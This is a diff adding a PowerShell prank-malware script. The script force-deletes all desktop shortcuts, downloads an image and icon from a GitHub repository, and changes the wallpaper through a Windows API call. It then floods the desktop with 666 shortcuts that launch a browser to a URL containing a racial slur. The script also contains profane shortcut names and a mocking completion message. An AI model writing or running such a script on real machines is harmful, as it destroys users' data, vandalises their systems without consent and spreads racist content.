@@ -1,0 +1,34 @@
+Get-ChildItem "$env:USERPROFILE\Desktop\*.lnk" | Remove-Item -Force
+
+$iconDir = "$env:APPDATA\Microsoft\Windows\Themes\SocialIcons"
+New-Item -Path $iconDir -ItemType Directory -Force | Out-Null
+
+$wallpaperUrl = "https://github.com/Socialfrfr/Kat-Boom/raw/main/catlick_1920x1080.png"
+$iconUrl = "https://github.com/Socialfrfr/Kat-Boom/raw/main/catlick.ico"
+$wallpaperPath = "$env:TEMP\cat_wallpaper.png"
+$iconPath = "$iconDir\system_icon.ico"
+
+Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath
+Invoke-WebRequest -Uri $iconUrl -OutFile $iconPath
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 0x01 -bor 0x02)
+
+$WshShell = New-Object -ComObject WScript.Shell
+1..666 | ForEach-Object {
+    $shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Fucked By Social's Basement ($_).lnk")
+    $shortcut.TargetPath = "cmd.exe"
+    $shortcut.Arguments = '/c start "" "https://www.niggafart.com/" && exit'
+    $shortcut.IconLocation = "$iconPath,0"
+    $shortcut.Save()
+}
+
+Remove-Item -Path $wallpaperPath -Force
+Write-Host "Fucked Completed" -ForegroundColor Cyan
